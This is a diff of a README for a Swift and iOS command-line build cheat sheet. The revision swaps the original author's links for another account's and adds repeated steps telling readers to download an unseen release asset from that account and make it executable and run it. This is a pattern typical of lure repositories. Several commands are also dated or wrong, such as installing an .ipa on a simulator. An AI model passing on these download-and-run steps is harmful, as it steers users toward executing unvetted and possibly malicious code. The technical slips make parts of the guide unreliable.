@@ -1,186 +1,228 @@
-# 🚀 Swift & iOS CLI Build Cheat Sheet
+# Swift iOS CLI Build Cheat Sheet — Compile, Automate
 
-[![Swift](https://img.shields.io/badge/Swift-6.1.2-orange.svg)](https://swift.org)
-[![Xcode](https://img.shields.io/badge/Xcode-16.4-blue.svg)](https://developer.apple.com/xcode/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/banghuazhao/Swift-iOS-CLI-Build-Cheat-Sheet?style=social)](https://github.com/banghuazhao/Swift-iOS-CLI-Build-Cheat-Sheet)
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github&link=https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases)](https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases)
 
-> **Master Swift development from the command line** 🎯
+![Swift Logo](https://swift.org/assets/images/swift.svg)
 
-A comprehensive, hands-on guide to building Swift applications using command-line tools. Perfect for developers who want to automate builds, set up CI/CD pipelines, or understand Swift's build system beyond Xcode's GUI.
+Master Swift toolchain tasks from the terminal. This repo collects concise, practical commands and scripts for:
+- swiftc and the Swift toolchain
+- Swift Package Manager (swift build, swift run, Package.swift)
+- xcodebuild for building, testing, archiving
+- xcrun and simctl for simulators and low-level tools
+- common CI/CD steps for iOS apps and CLI tools
 
-## ✨ What You'll Learn
+Table of contents
+- Features
+- Quick start
+  - Prerequisites
+  - Download and run release
+- Swift compiler (swiftc) examples
+- Swift Package Manager examples
+- xcodebuild: build, test, archive, export
+- xcrun + simctl: simulator control and device tasks
+- Code signing and exportOptions.plist
+- Building XCFrameworks and universal binaries
+- Automation and CI snippets
+- Helpful scripts and Makefile
+- Contributing
+- License
 
-- **swiftc**: Direct Swift compilation with fine-grained control
-- **Swift Package Manager**: Modern dependency management and building
-- **xcodebuild**: Professional iOS app building and distribution
-- **xcrun**: Cross-platform compilation and simulator management
+Features
+- One-page cheat sheet for command-line Swift and iOS build tooling
+- Focus on reproducible commands that run in CI and local shells
+- Examples for building CLI tools and full iOS apps
+- Commands for simulator automation and test runs
+- Packaging steps for App Store, TestFlight, and ad-hoc distribution
 
-## 🎯 Quick Start
+Quick start
 
-### Prerequisites
+Prerequisites
+- macOS with Xcode and Xcode Command Line Tools
+- swift toolchain (system or custom)
+- Access to code signing credentials (for device builds and archives)
 
-```bash
-# Install Xcode Command Line Tools
-xcode-select --install
+Download and execute
+- Visit the Releases page and download the provided script or archive. Download and run the release file you need:
+  - https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases
+- After download, make the file executable and run:
+  - chmod +x ./release-script.sh
+  - ./release-script.sh
 
-# Verify installation
-swift --version
-xcodebuild -version
-```
+The releases page contains packaged examples and helper scripts. The steps above assume the release includes an executable script. If your environment restricts execution, inspect the release asset before running.
 
-### Your First Swift Command
+Swift compiler (swiftc) examples
+- Compile a single Swift file to an executable:
+  - swiftc -o hello Hello.swift
+- Compile with debug symbols and optimization off:
+  - swiftc -g -O0 -o hello-debug Hello.swift
+- Compile to object file, then link (useful for custom link steps):
+  - swiftc -c -o Hello.o Hello.swift
+  - clang -o Hello Hello.o -lobjc -framework Foundation
+- Cross-compile using toolchain directory (custom toolchain):
+  - /Library/Developer/Toolchains/swift-DEVELOPMENT.xctoolchain/usr/bin/swiftc -o prog main.swift
 
-```bash
-# Create a simple Swift file
-echo 'print("Hello, Swift CLI!")' > hello.swift
+Swift Package Manager examples
+- Create a library or executable package:
+  - swift package init --type executable
+- Build a package:
+  - swift build --configuration release
+- Run the package locally:
+  - swift run
+- Run tests:
+  - swift test
+- Generate an Xcode project from Package.swift:
+  - swift package generate-xcodeproj
+- Build a package for a specific architecture or destination:
+  - swift build --destination .build/destinations/iphoneos.json
+  - Example destination JSON points to SDK root and tools version.
 
-# Compile and run
-swiftc hello.swift -o hello && ./hello
-```
+xcodebuild: build, test, archive, export
+- Build a scheme:
+  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -sdk iphoneos build
+- Build for simulator:
+  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -sdk iphonesimulator -destination 'platform=iOS Simulator,name=iPhone 14' build
+- Run tests on a simulator:
+  - xcodebuild test -workspace MyApp.xcworkspace -scheme "MyAppTests" -destination 'platform=iOS Simulator,name=iPhone 14,OS=17.0'
+- Archive the app:
+  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -archivePath ./build/MyApp.xcarchive archive
+- Export IPA from archive (uses exportOptionsPlist):
+  - xcodebuild -exportArchive -archivePath ./build/MyApp.xcarchive -exportOptionsPlist exportOptions.plist -exportPath ./build/export
+- Common flags to speed CI:
+  - -quiet to reduce log noise
+  - -allowProvisioningUpdates to allow Xcode to manage profiles in CI (use with care)
+- Clean build folder:
+  - xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" clean
 
-**🎉 You just built your first Swift app from the command line!**
+xcrun + simctl: simulator and toolchain tasks
+- List available simulators:
+  - xcrun simctl list devices
+- Boot a simulator and install an app:
+  - xcrun simctl boot "iPhone 14"
+  - xcrun simctl install booted ./build/export/MyApp.ipa
+  - xcrun simctl launch booted com.example.MyApp
+- Erase a simulator:
+  - xcrun simctl erase all
+- Run UI tests using simctl with XCTest:
+  - xcrun simctl spawn booted xctest -XCTest ... (advanced)
+- Use xcrun to run tools from Xcode toolchain:
+  - xcrun swiftc --version
+  - xcrun lipo -create -output UniversalBinary arm64.o x86_64.o
 
-## 📚 Detailed Guides
+Code signing and exportOptions.plist
+- For archived exports you need an exportOptions.plist. Minimal example for App Store:
+  - <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    <plist version="1.0">
+    <dict>
+      <key>method</key>
+      <string>app-store</string>
+      <key>uploadBitcode</key>
+      <false/>
+      <key>compileBitcode</key>
+      <true/>
+    </dict>
+    </plist>
+- For ad-hoc distribution:
+  - method = ad-hoc
+  - include provisioningProfileSpecifier or provisioningProfiles mapping
+- Common xcodebuild flags for signing in CI:
+  - -allowProvisioningUpdates
+  - CODE_SIGN_STYLE="Automatic" or "Manual"
+  - DEVELOPMENT_TEAM="YOUR_TEAM_ID"
 
-| Tool | Purpose | Guide | Examples |
-|------|---------|-------|----------|
-| **swiftc** | Direct Swift compilation | [📖 Full Guide](swiftc.md) | [📁 Examples](swiftc-examples/) |
-| **Swift Package Manager** | Modern build system | [📖 Full Guide](spm.md) | [📁 Examples](spm-examples/) |
-| **xcodebuild** | iOS app building | [📖 Full Guide](xcodebuild.md) | [📁 Examples](xcodebuild-examples/) |
-| **xcrun** | Cross-platform tools | [📖 Full Guide](xcrun.md) | [📁 Examples](xcrun-examples/) |
+Building XCFrameworks and universal binaries
+- Build frameworks for device and simulator, then create XCFramework:
+  - xcodebuild -scheme MyFramework -configuration Release -sdk iphoneos BUILD_DIR=build BUILD_ROOT=build clean build
+  - xcodebuild -scheme MyFramework -configuration Release -sdk iphonesimulator BUILD_DIR=build BUILD_ROOT=build clean build
+  - xcodebuild -create-xcframework -framework build/Release-iphoneos/MyFramework.framework -framework build/Release-iphonesimulator/MyFramework.framework -output MyFramework.xcframework
+- Use lipo for thin fat binaries (legacy):
+  - lipo -create -output MyLibUniversal.a arm64.a x86_64.a
 
-## 🛠️ Essential Commands
+Automation and CI snippets
+- Minimal GitHub Actions job for building and testing:
+  - name: Build and Test
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Set up Swift
+        uses: fwal/setup-swift@v1
+        with:
+          swift-version: '5.9'
+      - name: Build
+        run: swift build --configuration release
+      - name: Test
+        run: swift test
+- Archive and export in CI:
+  - Use xcodebuild archive and xcodebuild -exportArchive with exportOptions.plist
+  - Provide credentials via environment variables or secrets
+- Caching on CI:
+  - Cache SPM build artifacts: .build and DerivedData
+  - Cache CocoaPods or Carthage artifacts where relevant
 
-### Swift Compiler (swiftc)
+Helpful scripts and Makefile
+- Example Makefile targets
+  - build-cli:
+      swift build -c release
+  - run-cli:
+      swift run
+  - build-ios:
+      xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -sdk iphoneos build
+  - archive:
+      xcodebuild -workspace MyApp.xcworkspace -scheme "MyApp" -configuration Release -archivePath build/MyApp.xcarchive archive
+- Example release script (release-script.sh)
+  - #!/usr/bin/env bash
+    set -euo pipefail
+    PROJECT="MyApp"
+    WORKSPACE="${PROJECT}.xcworkspace"
+    SCHEME="${PROJECT}"
+    ARCHIVE_PATH="./build/${PROJECT}.xcarchive"
+    xcodebuild -workspace "${WORKSPACE}" -scheme "${SCHEME}" -configuration Release -archivePath "${ARCHIVE_PATH}" archive
+    xcodebuild -exportArchive -archivePath "${ARCHIVE_PATH}" -exportOptionsPlist exportOptions.plist -exportPath ./build/export
+  - Make the script executable and run it:
+    - chmod +x release-script.sh
+    - ./release-script.sh
 
-```bash
-# Single file compilation
-swiftc hello.swift -o hello && ./hello
+iOS simulator testing patterns
+- Run unit tests headless on CI:
+  - xcodebuild test -workspace MyApp.xcworkspace -scheme "MyAppTests" -destination 'platform=iOS Simulator,name=iPhone 14' -parallel-testing-enabled YES
+- Capture simulator logs:
+  - xcrun simctl spawn booted log stream --style compact > simulator.log &
+- Reset simulator state between runs:
+  - xcrun simctl shutdown all
+  - xcrun simctl erase all
 
-# Multi-file compilation
-swiftc *.swift -o MyApp
+Troubleshooting common errors
+- Code signing failures:
+  - Confirm provisioning profile and certificate match bundle ID and team.
+  - Confirm exportOptions.plist matches the signing method.
+- Missing simulator or OS:
+  - xcode-select --install
+  - xcodebuild -showsdks
+- DerivedData conflicts:
+  - rm -rf ~/Library/Developer/Xcode/DerivedData/*
+- Build cache issues:
+  - swift package clean
+  - xcodebuild clean -workspace MyApp.xcworkspace -scheme "MyApp"
 
-# Library compilation
-swiftc LibExample.swift \
-  -emit-library \
-  -emit-module \
-  -module-name MyLib \
-  -o libMyLib.dylib
-```
+Repository topics
+apple-platforms, automation, build-automation, build-tools, ci-cd, cli, command-line, cross-platform, development-workflow, ios-app-distribution, ios-development, ios-simulator, mobile-development, swift, swift-compiler, swift-package-manager, swift-toolchain, swiftc, xcodebuild, xcrun
 
-### Swift Package Manager
+Visual resources
+- Swift logo: https://swift.org/assets/images/swift.svg
+- Terminal art and icons: use shields and SVG badges for status and links
+  - Releases badge used at top links to: https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases
 
-```bash
-# Create new project
-swift package init --type executable --name MyCLITool
+Releases and packaged assets
+- Visit the Releases page and download the release asset that fits your task. The release may include helper scripts and packaged examples. After download, mark the file executable and run it:
+  - https://github.com/saina501/Swift-iOS-CLI-Build-Cheat-Sheet/releases
+- If a release includes a script, run:
+  - chmod +x ./path/to/release-script.sh
+  - ./path/to/release-script.sh
 
-# Build and run
-swift build                    # Debug build
-swift build -c release         # Release build
-swift run MyCLITool            # Run with arguments
-swift test                     # Run tests
-```
+Contributing
+- Open an issue for missing commands or incorrect steps.
+- Submit a pull request with small, focused changes.
+- Keep examples reproducible on macOS with Xcode and common SPM setups.
 
-### Xcode Build System
-
-```bash
-# List project schemes
-xcodebuild -list -project MyApp.xcodeproj
-
-# Build for iOS Simulator
-xcodebuild -project MyApp.xcodeproj -scheme MyApp \
-  -destination 'platform=iOS Simulator,name=iPhone 16' \
-  build
-
-# Archive for distribution
-xcodebuild -project MyApp.xcodeproj -scheme MyApp \
-  -destination 'generic/platform=iOS' \
-  -archivePath MyApp.xcarchive \
-  archive
-```
-
-### Cross-Platform Tools
-
-```bash
-# Find SDK paths
-xcodebuild -showsdks
-
-# Compile for iOS Simulator
-xcrun --sdk iphonesimulator swiftc main.swift \
-  -target arm64-apple-ios18.5-simulator -o app
-
-# Simulator management
-xcrun simctl list devices
-xcrun simctl boot "iPhone 16"
-```
-
-## 🎓 Learning Path
-
-### Beginner → Advanced
-
-1. **Start with swiftc** - Learn basic compilation
-2. **Move to SPM** - Understand modern Swift development
-3. **Master xcodebuild** - Build professional iOS apps
-4. **Explore xcrun** - Cross-platform and automation
-
-### Use Cases
-
-- **🔄 CI/CD Pipelines**: Automate your build process
-- **📱 iOS Development**: Build and distribute apps
-- **🔧 CLI Tools**: Create command-line applications
-- **📦 Libraries**: Build and distribute Swift packages
-- **🤖 Automation**: Script your development workflow
-
-## 🚀 Advanced Features
-
-### Multi-Platform Building
-
-```bash
-# Build for multiple platforms
-swift build --triple x86_64-apple-macosx14.0
-swift build --triple arm64-apple-macosx14.0
-```
-
-### iOS App Distribution
-
-```bash
-# Archive and export
-xcodebuild -exportArchive \
-  -archivePath MyApp.xcarchive \
-  -exportPath ./ipa \
-  -exportOptionsPlist ExportOptions.plist
-```
-
-### Simulator Automation
-
-```bash
-# Install and launch app
-xcrun simctl install booted ./MyApp.ipa
-xcrun simctl launch booted com.example.MyApp
-```
-
-## 🤝 Contributing
-
-Found an error or want to add more examples? Contributions are welcome!
-
-1. Fork the repository
-2. Create a feature branch
-3. Add your improvements
-4. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Apple for the amazing Swift toolchain
-- The Swift community for continuous improvements
-- All contributors who help make this guide better
-
----
-
-**⭐ Star this repository if it helped you master Swift CLI development!**
-
-[GitHub Repository](https://github.com/banghuazhao/Swift-iOS-CLI-Build-Cheat-Sheet)
+License
+- This repository uses the MIT License. Check the LICENSE file for details.
